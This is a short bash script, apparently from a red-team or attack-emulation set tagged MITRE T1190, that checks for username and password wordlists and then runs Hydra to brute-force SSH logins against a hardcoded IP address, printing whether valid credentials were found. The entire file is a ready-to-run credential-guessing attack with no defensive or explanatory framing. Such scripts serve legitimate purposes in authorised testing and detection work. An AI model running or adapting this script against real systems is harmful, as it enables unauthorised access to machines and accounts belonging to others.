#!/bin/bash

# T1190 Exploitation Script - SSH Weak Configuration Attack
# This script attempts to discover SSH service vulnerabilities and exploit weak configurations.

TARGET="100.0.0.40"
WORDLIST_USER="/home/attacks/wordlists/username.txt"
WORDLIST_PASS="/home/attacks/wordlists/password.txt"

# Attempt to brute force login using common usernames and passwords
if [ ! -f "$WORDLIST_USER" ] || [ ! -f "$WORDLIST_PASS" ]; then
    echo "[-] Username or password wordlist not found. Ensure $WORDLIST_USER and $WORDLIST_PASS exist."
    exit 1
fi

# Use Hydra to perform SSH brute force attack
echo "[+] Starting SSH brute force attack using Hydra..."
hydra -L "$WORDLIST_USER" -P "$WORDLIST_PASS" -t 1 -vV -f ssh://$TARGET

if [ $? -eq 0 ]; then
    echo "[+] Exploit successful: Found valid credentials using Hydra."
else
    echo "[-] Exploit failed: Could not find valid credentials."
fi

